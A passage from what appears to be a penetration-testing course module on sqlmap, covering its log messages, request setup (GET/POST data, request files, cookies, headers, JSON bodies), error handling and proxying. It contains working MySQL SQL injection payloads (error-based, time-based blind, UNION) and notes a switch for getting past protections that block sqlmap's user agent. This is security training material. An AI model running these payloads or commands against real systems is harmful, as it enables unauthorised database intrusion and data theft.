+    Payload: id=1 AND (<span class="hljs-name">SELECT</span> <span class="hljs-number">7744</span> FROM(<span class="hljs-name">SELECT</span> COUNT(<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>),CONCAT(<span class="hljs-name">0x7170706a71</span>,(<span class="hljs-name">SELECT</span> (<span class="hljs-name">ELT</span>(<span class="hljs-name">7744=7744</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">0</span>x71707a7871,FLOOR(<span class="hljs-name">RAND</span>(<span class="hljs-name">0</span>)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL &gt;= <span class="hljs-number">5.0</span>.12 AND time-based blind (<span class="hljs-name">query</span> SLEEP)
+    Payload: id=1 AND (<span class="hljs-name">SELECT</span> <span class="hljs-number">3669</span> FROM (<span class="hljs-name">SELECT</span>(<span class="hljs-name">SLEEP</span>(<span class="hljs-name">5</span>)))TIxJ)
+
+    Type: UNION query
+    Title: Generic UNION query (<span class="hljs-name">NULL</span>) - <span class="hljs-number">3</span> columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(<span class="hljs-name">0x7170706a71</span>,<span class="hljs-number">0</span>x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,<span class="hljs-number">0</span>x71707a7871)-- -
+---
+[<span class="hljs-name">22:26:56</span>] [<span class="hljs-name">INFO</span>] the back-end DBMS is MySQL
+web application technology: PHP <span class="hljs-number">5.2</span>.6, Apache <span class="hljs-number">2.2</span>.9
+back-end DBMS: MySQL &gt;= <span class="hljs-number">5.0</span>
+[<span class="hljs-name">22:26:57</span>] [<span class="hljs-name">INFO</span>] fetched data logged to text files under <span class="hljs-symbol">'/home/user/.sqlmap/output/www.example.com</span>'
+
+[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] ending @ <span class="hljs-number">22</span>:26:57 /2020-09-09/
+</code></pre>
+<p>Note: in this case, option '-u' is used to provide the target URL, while the switch '--batch' is used for skipping any required user-input, by automatically choosing using the default option.</p>
+<h2 id="sqlmap-output-description">SQLMap Output Description</h2>
+<hr>
+<p>At the end of the previous section, the sqlmap output showed us a lot of info during its scan. This data is usually crucial to understand, as it guides us through the automated SQL injection process. This shows us exactly what kind of vulnerabilities SQLMap is exploiting, which helps us report what type of injection the web application has. This can also become handy if we wanted to manually exploit the web application once SQLMap determines the type of injection and vulnerable parameter.</p>
+<hr>
+<h3 id="log-messages-description">Log Messages Description</h3>
+<p>The following are some of the most common messages usually found during a scan of SQLMap, along with an example of each from the previous exercise and its description.</p>
+<p><strong>URL content is stable</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"target URL content is stable"</li>
+</ul>
+<p>This means that there are no major changes between responses in case of continuous identical requests. This is important from the automation point of view since, in the event of stable responses, it is easier to spot differences caused by the potential SQLi attempts. While stability is important, SQLMap has advanced mechanisms to automatically remove the potential "noise" that could come from potentially unstable targets.</p>
+<p><strong>Parameter appears to be dynamic</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"GET parameter 'id' appears to be dynamic"</li>
+</ul>
+<p>It is always desired for the tested parameter to be "dynamic," as it is a sign that any changes made to its value would result in a change in the response; hence the parameter may be linked to a database. In case the output is "static" and does not change, it could be an indicator that the value of the tested parameter is not processed by the target, at least in the current context.</p>
+<p><strong>Parameter might be injectable</strong></p>
+<p><code>Log Message:</code> "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"</p>
+<p>As discussed before, DBMS errors are a good indication of the potential SQLi. In this case, there was a MySQL error when SQLMap sends an intentionally invalid value was used (e.g. <code>?id=1",)..).))'</code>), which indicates that the tested parameter could be SQLi injectable and that the target could be MySQL. It should be noted that this is not proof of SQLi, but just an indication that the detection mechanism has to be proven in the subsequent run.</p>
+<p><strong>Parameter might be vulnerable to XSS attacks</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"</li>
+</ul>
+<p>While it is not its primary purpose, SQLMap also runs a quick heuristic test for the presence of an XSS vulnerability. In large-scale tests, where a lot of parameters are being tested with SQLMap, it is nice to have these kinds of fast heuristic checks, especially if there are no SQLi vulnerabilities found.</p>
+<p><strong>Back-end DBMS is '...'</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]"</li>
+</ul>
+<p>In a normal run, SQLMap tests for all supported DBMSes. In case that there is a clear indication that the target is using the specific DBMS, we can narrow down the payloads to just that specific DBMS.</p>
+<p><strong>Level/risk values</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]"</li>
+</ul>
+<p>If there is a clear indication that the target uses the specific DBMS, it is also possible to extend the tests for that same specific DBMS beyond the regular tests.\
+This basically means running all SQL injection payloads for that specific DBMS, while if no DBMS were detected, only top payloads would be tested.</p>
+<p><strong>Reflective values found</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"reflective value(s) found and filtering out"</li>
+</ul>
+<p>Just a warning that parts of the used payloads are found in the response. This behavior could cause problems to automation tools, as it represents the junk. However, SQLMap has filtering mechanisms to remove such junk before comparing the original page content.</p>
+<p><strong>Parameter appears to be injectable</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")"</li>
+</ul>
+<p>This message indicates that the parameter appears to be injectable, though there is still a chance for it to be a false-positive finding. In the case of boolean-based blind and similar SQLi types (e.g., time-based blind), where there is a high chance of false-positives, at the end of the run, SQLMap performs extensive testing consisting of simple logic checks for removal of false-positive findings.</p>
+<p>Additionally, <code>with --string="luther"</code> indicates that SQLMap recognized and used the appearance of constant string value <code>luther</code> in the response for distinguishing <code>TRUE</code> from <code>FALSE</code> responses. This is an important finding because in such cases, there is no need for the usage of advanced internal mechanisms, such as dynamicity/reflection removal or fuzzy comparison of responses, which cannot be considered as false-positive.</p>
+<p><strong>Time-based comparison statistical model</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"time-based comparison requires a larger statistical model, please wait........... (done)"</li>
+</ul>
+<p>SQLMap uses a statistical model for the recognition of regular and (deliberately) delayed target responses. For this model to work, there is a requirement to collect a sufficient number of regular response times. This way, SQLMap can statistically distinguish between the deliberate delay even in the high-latency network environments.</p>
+<p><strong>Extending UNION query injection technique tests</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found"</li>
+</ul>
+<p>UNION-query SQLi checks require considerably more requests for successful recognition of usable payload than other SQLi types. To lower the testing time per parameter, especially if the target does not appear to be injectable, the number of requests is capped to a constant value (i.e., 10) for this type of check. However, if there is a good chance that the target is vulnerable, especially as one other (potential) SQLi technique is found, SQLMap extends the default number of requests for UNION query SQLi, because of a higher expectancy of success.</p>
+<p><strong>Technique appears to be usable</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test"</li>
+</ul>
+<p>As a heuristic check for the UNION-query SQLi type, before the actual <code>UNION</code> payloads are sent, a technique known as <code>ORDER BY</code> is checked for usability. In case that it is usable, SQLMap can quickly recognize the correct number of required <code>UNION</code> columns by conducting the binary-search approach.</p>
+<p>Note that this depends on the affected table in the vulnerable query.</p>
+<p><strong>Parameter is vulnerable</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]"</li>
+</ul>
+<p>This is one of the most important messages of SQLMap, as it means that the parameter was found to be vulnerable to SQL injections. In the regular cases, the user may only want to find at least one injection point (i.e., parameter) usable against the target. However, if we were running an extensive test on the web application and want to report all potential vulnerabilities, we can continue searching for all vulnerable parameters.</p>
+<p><strong>Sqlmap identified injection points</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:"</li>
+</ul>
+<p>Following after is a listing of all injection points with type, title, and payloads, which represents the final proof of successful detection and exploitation of found SQLi vulnerabilities. It should be noted that SQLMap lists only those findings which are provably exploitable (i.e., usable).</p>
+<p><strong>Data logged to text files</strong></p>
+<p><code>Log Message:</code></p>
+<ul>
+<li>"fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"</li>
+</ul>
+<p>This indicates the local file system location used for storing all logs, sessions, and output data for a specific target - in this case, <code>www.example.com</code>. After such an initial run, where the injection point is successfully detected, all details for future runs are stored inside the same directory's session files. This means that SQLMap tries to reduce the required target requests as much as possible, depending on the session files' data.</p>
+<h2 id="running-sqlmap-on-an-http-request">Running SQLMap on an HTTP Request</h2>
+<hr>
+<p>SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.</p>
+<p>In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability.</p>
+<hr>
+<h3 id="curl-commands">Curl Commands</h3>
+<p>One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing <code>Copy as cURL</code> feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools: <img src="storage\modules\58\M5UVR6n.png" alt="copy\_as\_curl"></p>
+<p>By pasting the clipboard content (<code>Ctrl-V</code>) into the command line, and changing the original command <code>curl</code> to <code>sqlmap</code>, we are able to use SQLMap with the identical <code>curl</code> command:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sqlmap 'http:/</span><span class="hljs-regexp">/www.example.com/</span>?id=<span class="hljs-number">1</span><span class="hljs-string">' -H '</span>User-Agent: Mozilla<span class="hljs-regexp">/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/</span>*<span class="hljs-string">' -H '</span>Accept-Language: en-US,en;q=<span class="hljs-number">0.5</span><span class="hljs-string">' --compressed -H '</span>Connection: keep-alive<span class="hljs-string">' -H '</span>DNT: <span class="hljs-number">1</span><span class="hljs-string">'</span>
+</code></pre>
+<p>When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. <code>--crawl</code>, <code>--forms</code> or <code>-g</code>).</p>
+<hr>
+<h3 id="get-post-requests">GET/POST Requests</h3>
+<p>In the most common scenario, <code>GET</code> parameters are provided with the usage of option <code>-u</code>/<code>--url</code>, as in the previous example. As for testing <code>POST</code> data, the <code>--data</code> flag can be used, as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sqlmap 'http:/</span><span class="hljs-regexp">/www.example.com/</span><span class="hljs-string">' --data '</span>uid=<span class="hljs-number">1</span>&amp;name=test<span class="hljs-string">'</span>
+</code></pre>
+<p>In such cases, <code>POST</code> parameters <code>uid</code> and <code>name</code> will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter <code>uid</code> is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using <code>-p uid</code>. Otherwise, we could mark it inside the provided data with the usage of special marker <code>*</code> as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ sqlmap 'http:/</span><span class="hljs-regexp">/www.example.com/</span><span class="hljs-string">' --data '</span>uid=<span class="hljs-number">1</span>*&amp;name=test<span class="hljs-string">'</span>
+</code></pre>
+<hr>
+<h3 id="full-http-requests">Full HTTP Requests</h3>
+<p>If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the <code>-r</code> flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. <code>Burp</code>) and written into the request file, as follows:</p>
+<p><img src="storage\modules\58\x7ND6VQ.png" alt="burp\_request"></p>
+<p>An example of an HTTP request captured with <code>Burp</code> would look like:</p>
+<p>Code: http</p>
+<pre><code class="lang-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?id=1</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: www.example.com
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.5
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">DNT</span>: 1
+<span class="hljs-attribute">If-Modified-Since</span>: Thu, 17 Oct 2019 07:18:26 GMT
+<span class="hljs-attribute">If-None-Match</span>: "3147526947"
+<span class="hljs-attribute">Cache-Control</span>: max-age=0
+</code></pre>
+<p>We can either manually copy the HTTP request from within <code>Burp</code> and write it to a file, or we can right-click the request within <code>Burp</code> and choose <code>Copy to file</code>. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option <code>Copy</code> &gt; <code>Copy Request Headers</code>, and then pasting the request into a file.</p>
+<p>To run SQLMap with an HTTP request file, we use the <code>-r</code> flag, as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___<span class="hljs-comment">["]</span>_____ ___ ___  {1.4.9}
+|_ -| . <span class="hljs-comment">[(]</span>     | .'| . |
+|___|_  <span class="hljs-comment">[.]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-comment">[*]</span> starting @ 14:32:59 /2020-09-11/
+
+<span class="hljs-comment">[14:32:59]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from 'req.txt'
+<span class="hljs-comment">[14:32:59]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+<span class="hljs-comment">[14:32:59]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable
+<span class="hljs-comment">[14:33:00]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable
+</code></pre>
+<p>Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.</p>
+<hr>
+<h3 id="custom-sqlmap-requests">Custom SQLMap Requests</h3>
+<p>If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.</p>
+<p>For example, if there is a requirement to specify the (session) cookie value to <code>PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c</code> option <code>--cookie</code> would be used as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sqlmap ... --cookie=<span class="hljs-string">'PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</span>
+</code></pre>
+<p>The same effect can be done with the usage of option <code>-H/--header</code>:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sqlmap ... -H=<span class="hljs-string">'Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</span>
+</code></pre>
+<p>We can apply the same to options like <code>--host</code>, <code>--referer</code>, and <code>-A/--user-agent</code>, which are used to specify the same HTTP headers' values.</p>
+<p>Furthermore, there is a switch <code>--random-agent</code> designed to randomly select a <code>User-agent</code> header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. <code>User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)</code>). Alternatively, the <code>--mobile</code> switch can be used to imitate the smartphone by using that same header value.</p>
+<p>While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. <code>--cookie="id=1*"</code>). The same principle applies to any other part of the request.</p>
+<p>Also, if we wanted to specify an alternative HTTP method, other than <code>GET</code> and <code>POST</code> (e.g., <code>PUT</code>), we can utilize the option <code>--method</code>, as follows:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u www.target.com --data=<span class="hljs-string">'id=1'</span> --<span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">PUT</span></span>
+</code></pre>
+<hr>
+<h3 id="custom-http-requests">Custom HTTP Requests</h3>
+<p>Apart from the most common form-data <code>POST</code> body style (e.g. <code>id=1</code>), SQLMap also supports JSON formatted (e.g. <code>{"id":1}</code>) and XML formatted (e.g. <code>&lt;element&gt;&lt;id&gt;1&lt;/id&gt;&lt;/element&gt;</code>) HTTP requests.</p>
+<p>Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the <code>POST</code> body is relatively simple and short, the option <code>--data</code> will suffice.</p>
+<p>However, in the case of a complex or long POST body, we can once again use the <code>-r</code> option:</p>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ cat req.txt
+HTTP / HTTP/<span class="hljs-number">1.0</span>
+Host: www.example.com
+
+{
+  <span class="hljs-string">"data"</span>: [{
+    <span class="hljs-string">"type"</span>: <span class="hljs-string">"articles"</span>,
+    <span class="hljs-string">"id"</span>: <span class="hljs-string">"1"</span>,
+    <span class="hljs-string">"attributes"</span>: {
+      <span class="hljs-string">"title"</span>: <span class="hljs-string">"Example JSON"</span>,
+      <span class="hljs-string">"body"</span>: <span class="hljs-string">"Just an example"</span>,
+      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2020-05-22T14:56:29.000Z"</span>,
+      <span class="hljs-string">"updated"</span>: <span class="hljs-string">"2020-05-22T14:56:28.000Z"</span>
+    },
+    <span class="hljs-string">"relationships"</span>: {
+      <span class="hljs-string">"author"</span>: {
+        <span class="hljs-string">"data"</span>: {<span class="hljs-string">"id"</span>: <span class="hljs-string">"42"</span>, <span class="hljs-string">"type"</span>: <span class="hljs-string">"user"</span>}
+      }
+    }
+  }]
+}
+</code></pre>
+<p>Running SQLMap on an HTTP Request</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-comment">[/htb]</span>$ sqlmap -r req.txt
+        ___
+       __H__
+ ___ ___<span class="hljs-comment">[(]</span>_____ ___ ___  {1.4.9}
+|_ -| . <span class="hljs-comment">[)]</span>     | .'| . |
+|___|_  <span class="hljs-comment">[']</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-comment">[*]</span> starting @ 00:03:44 /2020-09-15/
+
+<span class="hljs-comment">[00:03:44]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from 'req.txt'
+JSON data found in HTTP body. Do you want to process it? <span class="hljs-comment">[Y/n/q]</span> 
+<span class="hljs-comment">[00:03:45]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL
+<span class="hljs-comment">[00:03:45]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable
+<span class="hljs-comment">[00:03:46]</span> <span class="hljs-comment">[INFO]</span> testing if HTTP parameter 'JSON type' <span class="hljs-keyword">is</span> dynamic
+<span class="hljs-comment">[00:03:46]</span> <span class="hljs-comment">[WARNING]</span> HTTP parameter 'JSON type' does not appear to be dynamic
+<span class="hljs-comment">[00:03:46]</span> <span class="hljs-comment">[WARNING]</span> heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
+</code></pre>
+<h2 id="handling-sqlmap-errors">Handling SQLMap Errors</h2>
+<hr>
+<p>We may face many problems when setting up SQLMap or using it with HTTP requests. In this section, we will discuss the recommended mechanisms for finding the cause and properly fixing it.</p>
+<hr>
+<h3 id="display-errors">Display Errors</h3>
+<p>The first step is usually to switch the <code>--parse-errors</code>, to parse the DBMS errors (if any) and displays them as part of the program run:</p>
+<p>Handling SQLMap Errors</p>
+<pre><code class="lang-shell-session">...SNIP...
+[<span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">20</span>] [INFO] testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-symbol">'id</span>' <span class="hljs-keyword">is</span> dynamic
+[<span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">20</span>] [INFO] GET parameter <span class="hljs-symbol">'id</span>' appears <span class="hljs-keyword">to</span> be dynamic
+[<span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">20</span>] [<span class="hljs-literal">WARNING</span>] parsed DBMS <span class="hljs-literal">error</span> message: <span class="hljs-symbol">'SQLSTATE</span>[<span class="hljs-number">42000</span>]: Syntax <span class="hljs-literal">error</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">access</span> violation: <span class="hljs-number">1064</span> You have an <span class="hljs-literal">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> near '))<span class="hljs-string">"',),)((' at line 1'"</span>
+[<span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">20</span>] [INFO] heuristic (basic) test shows that GET parameter <span class="hljs-symbol">'id</span>' might be injectable (possible DBMS: <span class="hljs-symbol">'MySQL</span>')
+[<span class="hljs-number">16</span>:<span class="hljs-number">09</span>:<span class="hljs-number">20</span>] [<span class="hljs-literal">WARNING</span>] parsed DBMS <span class="hljs-literal">error</span> message: <span class="hljs-symbol">'SQLSTATE</span>[<span class="hljs-number">42000</span>]: Syntax <span class="hljs-literal">error</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">access</span> violation: <span class="hljs-number">1064</span> You have an <span class="hljs-literal">error</span> <span class="hljs-keyword">in</span> your SQL syntax; check the manual that corresponds <span class="hljs-keyword">to</span> your MySQL server version <span class="hljs-keyword">for</span> the right syntax <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> near '<span class="hljs-symbol">'YzDZJELylInm</span>' at <span class="hljs-literal">line</span> <span class="hljs-number">1</span>'
+...SNIP...
+</code></pre>
+<p>With this option, SQLMap will automatically print the DBMS error, thus giving us clarity on what the issue may be so that we can properly fix it.</p>
+<hr>
+<h3 id="store-the-traffic">Store the Traffic</h3>
+<p>The <code>-t</code> option stores the whole traffic content to an output file:</p>
+<p>Handling SQLMap Errors</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sqlmap -u <span class="hljs-string">"http://www.target.com/vuln.php?id=1"</span> --batch -t /tmp/traffic.txt
+
+root@htb[/htb]$ cat /tmp/traffic.txt
+HTTP request [<span class="hljs-comment">#1]:</span>
+GET /?id=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1.1</span>
+<span class="hljs-attr">Host:</span> www.example.com
+<span class="hljs-attr">Cache-control:</span> <span class="hljs-literal">no</span>-cache
+<span class="hljs-attr">Accept-encoding:</span> gzip,deflate
+<span class="hljs-attr">Accept:</span> */*
+<span class="hljs-attr">User-agent:</span> sqlmap/<span class="hljs-number">1.4</span><span class="hljs-number">.9</span> (http://sqlmap.org)
+<span class="hljs-attr">Connection:</span> close
+
+HTTP response [<span class="hljs-comment">#1] (200 OK):</span>
+<span class="hljs-attr">Date:</span> Thu, <span class="hljs-number">24</span> Sep <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">12</span>:<span class="hljs-number">50</span> GMT
+<span class="hljs-attr">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)
+<span class="hljs-attr">Vary:</span> Accept-Encoding
+<span class="hljs-attr">Content-Encoding:</span> gzip
+<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">914</span>
+<span class="hljs-attr">Connection:</span> close
+<span class="hljs-attr">Content-Type:</span> text/html; charset=UTF<span class="hljs-bullet">-8</span>
+<span class="hljs-attr">URI:</span> http://www.example.com:<span class="hljs-number">80</span>/?id=<span class="hljs-number">1</span>
+
+&lt;!DOCTYPE html<span class="hljs-string">&gt;
+&lt;html lang="en"&gt;
+...SNIP...</span>
+</code></pre>
+<p>As we can see from the above output, the <code>/tmp/traffic.txt</code> file now contains all sent and received HTTP requests. So, we can now manually investigate these requests to see where the issue is occurring.</p>
+<hr>
+<h3 id="verbose-output">Verbose Output</h3>
+<p>Another useful flag is the <code>-v</code> option, which raises the verbosity level of the console output:</p>
+<p>Handling SQLMap Errors</p>
+<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sqlmap -u <span class="hljs-string">"http://www.target.com/vuln.php?id=1"</span> -v <span class="hljs-number">6</span> --batch
+        ___
+       __H__
+ ___ ___<span class="hljs-string">[,]</span>_____ ___ ___  {<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span>}
+|_ -| . <span class="hljs-string">[(]</span>     | .'| . |
+|___|_  <span class="hljs-string">[(]</span>_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+<span class="hljs-string">[*]</span> starting @ <span class="hljs-number">16</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> /<span class="hljs-number">2020</span>-<span class="hljs-number">09</span>-<span class="hljs-number">24</span>/
+
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> cleaning up configuration parameters
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> setting the HTTP timeout
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> setting the HTTP User-Agent header
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> creating HTTP requests opener object
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> resolving hostname 'www.example.com'
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[INFO]</span> testing connection to the target URL
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[TRAFFIC OUT]</span> HTTP request <span class="hljs-string">[#1]</span>:
+GET /?id=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
+Host: www.example.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">9</span> (http://sqlmap.org)
+Connection: close
+
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[DEBUG]</span> declared web page charset 'utf-<span class="hljs-number">8</span>'
+<span class="hljs-string">[16:17:40]</span> <span class="hljs-string">[TRAFFIC IN]</span> HTTP response <span class="hljs-string">[#1]</span> (<span class="hljs-number">200</span> OK):
+Date: Thu, <span class="hljs-number">24</span> Sep <span class="hljs-number">2020</span> <span class="hljs-number">14</span>:<span class="hljs-number">17</span>:<span class="hljs-number">40</span> GMT
+Server: Apache/<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">41</span> (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: <span class="hljs-number">914</span>
+Connection: close
+Content-Type: text/html; charset=UTF-<span class="hljs-number">8</span>
+URI: http://www.example.com:<span class="hljs-number">80</span>/?id=<span class="hljs-number">1</span>
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=<span class="hljs-string">"en"</span>&gt;
+
+&lt;head&gt;
+  &lt;meta charset=<span class="hljs-string">"utf-8"</span>&gt;
+  &lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;
+  &lt;meta name=<span class="hljs-string">"description"</span> content=<span class="hljs-string">""</span>&gt;
+  &lt;meta name=<span class="hljs-string">"author"</span> content=<span class="hljs-string">""</span>&gt;
+  &lt;link href=<span class="hljs-string">"vendor/bootstrap/css/bootstrap.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span>&gt;
+  &lt;title&gt;SQLMap Essentials - Case1&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+...SNIP...
+</code></pre>
+<p>As we can see, the <code>-v 6</code> option will directly print all errors and full HTTP request to the terminal so that we can follow along with everything SQLMap is doing in real-time.</p>
+<hr>
+<h3 id="using-proxy">Using Proxy</h3>
+<p>Finally, we can utilize the <code>--proxy</code> option to redirect the whole traffic through a (MiTM) proxy (e.g., <code>Burp</code>). This will route all SQLMap traffic through <code>Burp</code>, so that we can later manually investigate all requests, repeat them, and utilize all features of <code>Burp</code> with these requests:</p>
+<p><img src="storage\modules\58\eIwJeV3.png" alt="burp\_proxy"></p>
+<h2 id="attack-tuning">Attack Tuning</h2>
+<hr>
+<p>In most cases, SQLMap should run out of the box with the provided target details. Nevertheless, there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every payload sent to the target consists of:</p>
+<ul>
+<li>vector (e.g., <code>UNION ALL SELECT 1,2,VERSION()</code>): central part of the payload, carrying the useful SQL code to be executed at the target.</li>
